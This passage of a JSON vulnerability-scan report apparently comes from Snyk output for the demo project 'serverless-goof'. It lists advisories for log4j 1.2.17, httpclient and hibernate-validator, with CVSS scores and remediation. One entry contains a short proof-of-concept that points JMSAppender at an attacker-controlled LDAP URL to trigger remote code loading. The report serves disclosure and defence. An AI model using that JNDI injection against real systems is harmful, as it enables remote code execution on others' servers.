      "description": "## Overview\n\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution.\n<br /> **Note:** Even though this vulnerability appears to be related to the [log4j 2.x vulnerability](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720), the 1.x branch of the module requires an attacker to have access to modify configurations to be exploitable, which is rarely possible.\r\n\r\nIn order to leverage this vulnerability the following conditions must be met:\r\n\r\n1. The application has enabled `JMSAppender` (or a class that extends `JMSAppender`)\r\n2. The attacker has access to directly modify the `TopicBindingName` or `TopicConnectionFactoryBindingName` configuration variables - which is an unlikely scenario \r\n\r\nIf these conditions are met, log4j 1.x allows a `lookup` feature that does not protect against attacker-controlled LDAP and other JNDI related endpoints. Therefore, an attacker with access to the aforementioned configuration variables is able to execute arbitrary code when loaded from an LDAP server.\r\n\r\n## PoC\r\n\r\n```\r\nimport org.apache.log4j.net.JMSAppender;\r\n// ...\r\nJMSAppender a = new JMSAppender();\r\na.setTopicConnectionFactoryBindingName(\"ldap://<malicious-url>\");\r\n// OR a.setTopicBindingName(\"ldap://<malicious-url>\");\r\na.activateOptions();\r\n```\n\n## Remediation\n\nThere is no fixed version for `log4j:log4j`.\n\n\nlog4j 1.x is End-of-Life, and a fixed version will not be released.\nIf you believe your application meets the conditions mentioned in the advisory, consider upgrading to the latest log4j 2.x version, or block user input from reaching `JMSAppender` configurations.\n\n## References\n\n- [Apache Mail](https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx)\n\n- [GitHub Comment](https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301)\n\n- [GitHub Discussion](https://github.com/apache/logging-log4j2/pull/608)\n",
      "disclosureTime": "2021-12-10T00:00:00Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [],
      "id": "SNYK-JAVA-LOG4J-2316893",
      "identifiers": {
        "CWE": [
          "CWE-94"
        ],
        "CVE": [
          "CVE-2021-4104"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-02-15T15:25:01.031655Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-12-13T15:31:00Z",
      "references": [
        {
          "title": "Apache Mail",
          "url": "https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx"
        },
        {
          "title": "GitHub Comment",
          "url": "https://github.com/apache/logging-log4j2/pull/608%23issuecomment-991723301"
        },
        {
          "title": "GitHub Discussion",
          "url": "https://github.com/apache/logging-log4j2/pull/608"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "severityWithCritical": "medium",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.amazonaws:aws-lambda-java-log4j@1.0.0",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2022-01-18T17:06:29.378900Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to SQL Injection. By design, the `JDBCAppender` in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from `PatternLayout`. The message converter, `%m`, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed.\r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use the `JDBCAppender`, which is not the default. \r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions. Beginning in version 2.0-beta8, the `JDBCAppender` was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2)\n",
      "disclosureTime": "2022-01-18T17:01:37Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [],
      "id": "SNYK-JAVA-LOG4J-2342645",
      "identifiers": {
        "CWE": [
          "CWE-89"
        ],
        "CVE": [
          "CVE-2022-23305"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-04-21T15:25:42.244412Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-01-18T17:13:25Z",
      "references": [
        {
          "title": "Apache Mailing List",
          "url": "https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y"
        },
        {
          "title": "Apache Security Advisory",
          "url": "https://logging.apache.org/log4j/1.2/index.html"
        },
        {
          "title": "Reload4j Fix Commit",
          "url": "https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "SQL Injection",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.amazonaws:aws-lambda-java-log4j@1.0.0",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2022-01-18T17:08:37.955423Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [NVD Information](https://nvd.nist.gov/vuln/detail/CVE-2020-9493)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0)\n",
      "disclosureTime": "2022-01-18T17:06:32Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [],
      "id": "SNYK-JAVA-LOG4J-2342646",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2022-23307"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-03-27T14:18:24.241895Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-01-18T17:13:25Z",
      "references": [
        {
          "title": "Apache Mailing List",
          "url": "https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh"
        },
        {
          "title": "Apache Security Advisory",
          "url": "https://logging.apache.org/log4j/1.2/index.html"
        },
        {
          "title": "NVD Information",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-9493"
        },
        {
          "title": "Reload4j Fix Commit",
          "url": "https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.amazonaws:aws-lambda-java-log4j@1.0.0",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2022-01-18T17:25:51.891230Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. `JMSSink` in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a `TopicConnectionFactoryBindingName` configuration causing `JMSSink` to perform `JNDI` requests that result in remote code execution in a similar fashion to [`CVE-2021-4104`](https://security.snyk.io/vuln/SNYK-JAVA-LOG4J-2316893).  \r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use `JMSSink`, which is not the default.\r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9)\n",
      "disclosureTime": "2022-01-18T17:22:50Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [],
      "id": "SNYK-JAVA-LOG4J-2342647",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2022-23302"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-03-27T14:15:25.880692Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-01-18T17:28:19Z",
      "references": [
        {
          "title": "Apache Mailing List",
          "url": "https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w"
        },
        {
          "title": "Apache Security Advisory",
          "url": "https://logging.apache.org/log4j/1.2/index.html"
        },
        {
          "title": "Reload4j Fix Commit",
          "url": "https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.amazonaws:aws-lambda-java-log4j@1.0.0",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2020-06-18T15:47:31.144561Z",
      "credit": [
        "Marcio Almeida de Macedo"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E)\n- [PoC](https://0xsapra.github.io/website/CVE-2019-17571)\n",
      "disclosureTime": "2019-12-22T09:33:11Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "org/apache/log4j/net/SocketServer.java",
            "className": "SocketServer",
            "functionName": "main"
          },
          "version": [
            "[0,]"
          ]
        }
      ],
      "fixedIn": [],
      "id": "SNYK-JAVA-LOG4J-572732",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-2qrg-x229-3v8q"
        ],
        "CVE": [
          "CVE-2019-17571"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-02-11T15:25:01.017358Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-06-19T09:33:01Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E"
        },
        {
          "title": "PoC",
          "url": "https://0xsapra.github.io/website/CVE-2019-17571"
        }
      ],
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "org.apache.log4j.net.SocketServer",
            "functionName": "main"
          },
          "version": [
            "[0,]"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "severityWithCritical": "critical",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.amazonaws:aws-lambda-java-log4j@1.0.0",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2020-12-03T12:39:42.924071Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[org.apache.httpcomponents:httpclient](http://hc.apache.org/) is a HttpClient component of the Apache HttpComponents project.\n\nAffected versions of this package are vulnerable to Improper Input Validation. Apache HttpClient can misinterpret malformed authority component in request URIs passed to the library as `java.net.URI` object and pick the wrong target host for request execution.\n## Remediation\nUpgrade `org.apache.httpcomponents:httpclient` to version 4.5.13 or higher.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/r6dab7da30f8bf075f79ee189e33b45a197502e2676481bb8787fc0d7%40%3Cdev.hc.apache.org%3E)\n- [GitHub Commit](https://github.com/apache/httpcomponents-client/commit/894234a5aeb9958e7e466c383e4d0ded17a9a813#diff-a169c0c63c537750e3394f7e1407252053ffbc489181450a6c361cd7f8f67a22)\n- [GitHub Commit](https://github.com/apache/httpcomponents-client/commit/e628b4c5c464c2fa346385596cc78e035a91a62e)\n",
      "disclosureTime": "2020-12-03T12:36:52Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "org/apache/http/client/utils/URIUtils.java",
            "className": "URIUtils",
            "functionName": "extractHost"
          },
          "version": [
            "[,4.5.13)"
          ]
        }
      ],
      "fixedIn": [
        "4.5.13"
      ],
      "id": "SNYK-JAVA-ORGAPACHEHTTPCOMPONENTS-1048058",
      "identifiers": {
        "CWE": [
          "CWE-20"
        ],
        "GHSA": [
          "GHSA-7r82-7xv7-xcpj"
        ],
        "CVE": [
          "CVE-2020-13956"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-07-06T14:08:56.914550Z",
      "moduleName": "org.apache.httpcomponents:httpclient",
      "packageManager": "maven",
      "packageName": "org.apache.httpcomponents:httpclient",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-12-03T16:47:50Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://lists.apache.org/thread.html/r6dab7da30f8bf075f79ee189e33b45a197502e2676481bb8787fc0d7%40%3Cdev.hc.apache.org%3E"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/httpcomponents-client/commit/894234a5aeb9958e7e466c383e4d0ded17a9a813%23diff-a169c0c63c537750e3394f7e1407252053ffbc489181450a6c361cd7f8f67a22"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/httpcomponents-client/commit/e628b4c5c464c2fa346385596cc78e035a91a62e"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Improper Input Validation",
      "functions_new": [
        {
          "functionId": {
            "className": "org.apache.http.client.utils.URIUtils",
            "functionName": "extractHost"
          },
          "version": [
            "[,4.5.13)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,4.5.13)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.apache.httpcomponents",
        "artifactId": "httpclient"
      },
      "severityWithCritical": "medium",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.amazonaws:aws-java-sdk-dynamodb@1.11.34",
        "com.amazonaws:aws-java-sdk-core@1.11.34",
        "org.apache.httpcomponents:httpclient@4.5.5"
      ],
      "upgradePath": [
        false,
        "com.amazonaws:aws-java-sdk-dynamodb@1.11.1034",
        "com.amazonaws:aws-java-sdk-core@1.11.1034",
        "org.apache.httpcomponents:httpclient@4.5.13"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.httpcomponents:httpclient",
      "version": "4.5.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-07-16T08:36:35.210070Z",
      "credit": [
        "Gunnar Morling"
      ],
      "cvssScore": 7,
      "description": "## Overview\n[org.hibernate:hibernate-validator](https://mvnrepository.com/artifact/org.hibernate/hibernate-validator) is a Hibernate Validator Engine Relocation Artifact.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. An attacker may be able to validate an invalid instance and access the private member value via the `ConstraintViolation#getInvalidValue()` function.\n## Remediation\nUpgrade `org.hibernate:hibernate-validator` to version 5.2.5.Final, 5.3.6.Final, 5.4.2.Final or higher.\n## References\n- [GitHub Commit](https://github.com/hibernate/hibernate-validator/commit/0778a5c98b817771a645c6f4ba0b28dd8b5437b)\n- [GitHub Commit](https://github.com/hibernate/hibernate-validator/commit/0886e89900d343ea20fde5137c9a3086e6da9ac)\n- [GitHub Commit](https://github.com/hibernate/hibernate-validator/commit/0ed45f37c4680998167179e631113a2c9cb5d11)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1465573)\n",
      "disclosureTime": "2018-01-10T17:51:09Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "org/hibernate/validator/internal/engine/ConstraintViolationImpl.java",
            "className": "ConstraintViolationImpl",
            "functionName": "getInvalidValue"
          },
          "version": [
            "[5.2.0.Final,5.2.5.Final)",
            "[5.3.0.Final, 5.3.6.Final)",
            "[5.4.0.Final, 5.4.2.Final)"
          ]
        }
      ],
      "fixedIn": [
        "5.2.5.Final",
        "5.3.6.Final",
        "5.4.2.Final"
      ],
      "id": "SNYK-JAVA-ORGHIBERNATE-451605",
      "identifiers": {
        "CWE": [
          "CWE-94"
        ],
        "GHSA": [
          "GHSA-xxgp-pcfc-3vgc"
        ],
        "CVE": [
          "CVE-2017-7536"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-14T14:41:04.771016Z",
      "moduleName": "org.hibernate:hibernate-validator",
      "packageManager": "maven",
      "packageName": "org.hibernate:hibernate-validator",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-02-12T14:51:05Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/hibernate/hibernate-validator/commit/0778a5c98b817771a645c6f4ba0b28dd8b5437b"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/hibernate/hibernate-validator/commit/0886e89900d343ea20fde5137c9a3086e6da9ac"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/hibernate/hibernate-validator/commit/0ed45f37c4680998167179e631113a2c9cb5d11"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1465573"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "functions_new": [
        {
          "functionId": {
            "className": "org.hibernate.validator.internal.engine.ConstraintViolationImpl",
            "functionName": "getInvalidValue"
          },
          "version": [
            "[5.2.0.Final,5.2.5.Final)",
            "[5.3.0.Final, 5.3.6.Final)",
            "[5.4.0.Final, 5.4.2.Final)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[5.2.0.Final,5.2.5.Final)",
          "[5.3.0.Final, 5.3.6.Final)",
          "[5.4.0.Final, 5.4.2.Final)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.hibernate",
        "artifactId": "hibernate-validator"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.github.derjust:spring-data-dynamodb@4.3.1",
        "org.hibernate:hibernate-validator@5.2.4.Final"
      ],
      "upgradePath": [
        false,
        "com.github.derjust:spring-data-dynamodb@5.0.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.hibernate:hibernate-validator",
      "version": "5.2.4.Final"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2020-05-05T12:05:58.541980Z",
      "credit": [
        "Alvaro MuÃ±oz"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[org.hibernate:hibernate-validator](https://mvnrepository.com/artifact/org.hibernate/hibernate-validator) is a Hibernate Validator Engine Relocation Artifact.\n\nAffected versions of this package are vulnerable to Improper Input Validation. A bug in the message interpolation processor enables invalid EL expressions to be evaluated as if they were valid. This flaw allows attackers to bypass input sanitation (escaping, stripping) controls that developers may have put in place when handling user-controlled data in error messages.\n## Remediation\nUpgrade `org.hibernate:hibernate-validator` to version 6.0.19.Final, 6.1.3.Final or higher.\n## References\n- [GitHub PR](https://github.com/hibernate/hibernate-validator/pull/1071)\n- [Jira Issue](https://hibernate.atlassian.net/browse/HV-1758)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1805501)\n",
      "disclosureTime": "2020-05-05T00:00:00Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "org/hibernate/validator/internal/engine/ValidatorImpl.java",
            "className": "ValidatorImpl",
            "functionName": "validate"
          },
          "version": [
            "[,6.0.19.Final)",
            "[6.1.0,6.1.3.Final)"
          ]
        }
      ],
      "fixedIn": [
        "6.0.19.Final",
        "6.1.3.Final"
      ],
      "id": "SNYK-JAVA-ORGHIBERNATE-568162",
      "identifiers": {
        "CWE": [
          "CWE-20"
        ],
        "GHSA": [
          "GHSA-rmrm-75hp-phr2"
        ],
        "CVE": [
          "CVE-2020-10693"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-07-06T14:08:58.015029Z",
      "moduleName": "org.hibernate:hibernate-validator",
      "packageManager": "maven",
      "packageName": "org.hibernate:hibernate-validator",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-05-05T16:32:46Z",
      "references": [
        {
          "title": "GitHub PR",
          "url": "https://github.com/hibernate/hibernate-validator/pull/1071"
        },
        {
          "title": "Jira Issue",
          "url": "https://hibernate.atlassian.net/browse/HV-1758"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1805501"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Improper Input Validation",
      "functions_new": [
        {
          "functionId": {
            "className": "org.hibernate.validator.internal.engine.ValidatorImpl",
            "functionName": "validate"
          },
          "version": [
            "[,6.0.19.Final)",
            "[6.1.0,6.1.3.Final)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,6.0.19.Final)",
          "[6.1.0,6.1.3.Final)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.hibernate",
        "artifactId": "hibernate-validator"
      },
      "severityWithCritical": "medium",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.github.derjust:spring-data-dynamodb@4.3.1",
        "org.hibernate:hibernate-validator@5.2.4.Final"
      ],
      "upgradePath": [
        false,
        "com.github.derjust:spring-data-dynamodb@5.0.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.hibernate:hibernate-validator",
      "version": "5.2.4.Final"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N/E:U/RL:O/RC:R",
      "alternativeIds": [],
      "creationTime": "2020-05-14T16:07:06.897969Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.hibernate:hibernate-validator](https://mvnrepository.com/artifact/org.hibernate/hibernate-validator) is a Hibernate Validator Engine Relocation Artifact.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). The `SafeHtml` validator annotation fails to properly sanitize payloads consisting of potentially malicious code in HTML comments and instructions.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browserâ€™s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if theyâ€™ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP 